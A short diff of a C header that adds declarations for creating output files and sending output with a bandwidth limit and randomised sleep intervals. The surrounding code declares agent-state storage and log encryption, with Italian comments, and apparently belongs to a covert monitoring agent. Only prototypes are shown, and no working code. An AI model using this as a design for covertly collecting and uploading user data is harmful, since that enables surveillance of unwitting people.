@@ -21,6 +21,8 @@ extern BOOL Log_SaveAgentState(DWORD, BYTE *, DWORD);
 extern BOOL Log_RestoreAgentState(DWORD, BYTE *, DWORD);
 extern void LOG_InitCryptKey(BYTE *, BYTE *);
 extern void LOG_InitSequentialLogs();
+extern HANDLE Log_CreateOutputFile(char *command_name);
+extern BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep);
 
 #define LOG_CONF_NEW_FILE 0  // c'e' un nuovo file
 #define LOG_CONF_NOP      1  // non c'e' un nuovo file
